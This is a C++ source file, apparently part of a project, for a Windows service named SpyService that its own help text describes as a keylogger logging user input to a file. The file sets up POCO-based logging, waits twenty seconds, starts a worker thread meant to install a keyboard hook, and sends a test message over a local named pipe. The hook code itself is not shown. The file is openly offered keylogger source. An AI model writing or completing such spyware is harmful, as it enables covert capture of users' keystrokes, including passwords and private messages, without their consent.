#include "SpyService.h"
#include "WorkerThread.h"

SpyService::SpyService() : _helpRequested(false) {}


void SpyService::initialize(Application& self)
{
    std::string appPath = Poco::Path(commandPath()).parent().toString();

    loadConfiguration(appPath + "SpyService.properties"); // загрузить конфигурацию из файла или из командной строки
    ServerApplication::initialize(self);

    /*Logger& logger = Logger::get("TestLogger");
    logger.information("This is an informational message");
    logger.warning("This is a warning message");*/

    std::string loggerName = config().getString("application.logger.name");
    std::string logLevel = config().getString("application.logger.level", "debug");
    std::string logFile = config().getString("application.logger.file", "mylog.log");
    std::string rotationLog = config().getString("application.logger.rotation");
    std::string patternLog = config().getString("application.logger.pattern");

    /*
    * Создание логера приложения
    */
    AutoPtr<FileChannel> pChannel(new FileChannel);
    pChannel->setProperty("path", appPath + logFile);
    pChannel->setProperty("rotation", rotationLog);
    pChannel->setProperty("archive", "timestamp");
    Poco::AutoPtr<Poco::PatternFormatter> pPatern(new Poco::PatternFormatter);
    pPatern->setProperty("pattern", patternLog);
    Poco::AutoPtr<Poco::FormattingChannel> pAppLoggerFormatterChannel(new Poco::FormattingChannel(pPatern, pChannel));
    Logger::get("AppLogger").setChannel(pAppLoggerFormatterChannel);
    Logger::get("AppLogger").setLevel(logLevel);

}

void SpyService::uninitialize()
{
    ServerApplication::uninitialize();
}

void SpyService::defineOptions(OptionSet& options)
{
    ServerApplication::defineOptions(options);

    options.addOption(
        Option("help", "h", "display help information on command line arguments")
        .required(false)
        .repeatable(false));
}

void SpyService::handleOption(const std::string& name, const std::string& value)
{
    ServerApplication::handleOption(name, value);

    if (name == "help")
        _helpRequested = true;
}

void SpyService::displayHelp()
{
    HelpFormatter helpFormatter(options());
    helpFormatter.setCommand(commandName());
    helpFormatter.setUsage("OPTIONS");
    helpFormatter.setHeader("A keylogger Windows service that logs user input to a file.");
    helpFormatter.format(std::cout);
}

void SpyService::installKeyboardHookProcess() {
    Poco::Util::Application* app = &Poco::Util::Application::instance();

    WorkerThread runnable(app);

    Poco::Thread thread;

    thread.start(runnable);

    logger().get("AppLogger").information("Message from main thread");

    thread.join();

    //thread.detach();

}

int SpyService::main(const std::vector<std::string>& args)
{
    if (_helpRequested)
    {
        displayHelp();
        return Application::EXIT_OK;
    }
    std::this_thread::sleep_for(std::chrono::seconds(20));
    //Установка хука клавиатуры
    installKeyboardHookProcess();


    HANDLE hPipe = CreateFile(L"\\\\.\\pipe\\MyNamedPipe", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hPipe == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open named pipe with error " << GetLastError() << std::endl;
        return 1;
    }

    // Отправка данных на сервер
    const char* sendData = "Hello from client";
    DWORD cbWritten;
    if (!WriteFile(hPipe, sendData, strlen(sendData) + 1, &cbWritten, NULL)) {
        std::cerr << "Failed to write to named pipe with error " << GetLastError() << std::endl;
        CloseHandle(hPipe);
        //return 1;
    }

    //// Чтение ответа от сервера
    //const int BUFFER_SIZE = 1024;
    //char buffer[BUFFER_SIZE];
    //DWORD cbRead;
    //if (!ReadFile(hPipe, buffer, BUFFER_SIZE, &cbRead, NULL)) {
    //    std::cerr << "Failed to read from named pipe with error " << GetLastError() << std::endl;
    //    CloseHandle(hPipe);
    //    //return 1;
    //}

    // Закрытие канала
    CloseHandle(hPipe);



    waitForTerminationRequest();
    return Application::EXIT_OK;
}

POCO_SERVER_MAIN(SpyService)